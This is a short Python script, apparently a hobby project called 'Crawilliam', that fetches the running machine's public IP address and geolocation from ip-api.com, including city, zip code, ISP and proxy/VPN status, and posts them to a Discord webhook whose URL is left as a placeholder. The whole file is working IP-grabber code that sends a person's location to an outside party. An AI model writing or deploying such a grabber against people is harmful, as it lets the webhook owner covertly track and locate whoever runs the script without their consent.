from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import json
from time import sleep

#IP Address and Geolocation API
Addy = requests.get('http://ip-api.com/json/')
FormAddy = json.loads(Addy.content)
GeoLoc = requests.get(f'http://ip-api.com/json/{FormAddy["query"]}?fields=1830911').text
Pinfo = json.loads(GeoLoc)

#Function used to upload IP and Geolocation from API using Discord Webhook
def WebhookLoop():
    webhook = DiscordWebhook(url='WEBHOOKHERE', username='Crawilliam')

    embed = DiscordEmbed(
    title="Crawilliam's Fetch",
    description='Crawilliam returns with...',
    color='A168F3'
    )
#Probably a more efficient way of doing this, can't think of one though, too tired
    embed.set_author(name='Crawilliam', url='https://github.com/NotXeroShi', icon_url='https://i.redd.it/5ifqxapw1rz41.jpg')
    embed.add_embed_field(name='Status:', value=Pinfo['status'], inline=False)
    embed.add_embed_field(name='IP Address:', value=Pinfo['query'], inline=False)
    embed.add_embed_field(name='Country:', value=Pinfo['country'])
    embed.add_embed_field(name='Reigon:', value=Pinfo['regionName'])
    #embed.add_embed_field(name='District:', value=Pinfo['district']) <= Returns as Null. Uncomment if you find someone to r
    embed.add_embed_field(name='City', value=Pinfo['city'])
    embed.add_embed_field(name='Zip Code:', value=Pinfo['zip'])
    embed.add_embed_field(name='ISP:', value=Pinfo['isp'])
    embed.add_embed_field(name='Mobile Connection:', value=Pinfo['mobile'])
    embed.add_embed_field(name='Proxy, VPN, Tor Exit:', value=Pinfo['proxy'])
    embed.set_timestamp()
    embed.set_footer(text='Made with Sleepless Delusions.')
    webhook.add_embed(embed)
    response = webhook.execute()
    #sleep(15) #temp time, just using this to see how well it works.
    #response = webhook.edit(response) #edits last message sent

#Loop to put this mess together
#while True:
    #sleep(30)
    #WebhookLoop()

WebhookLoop()
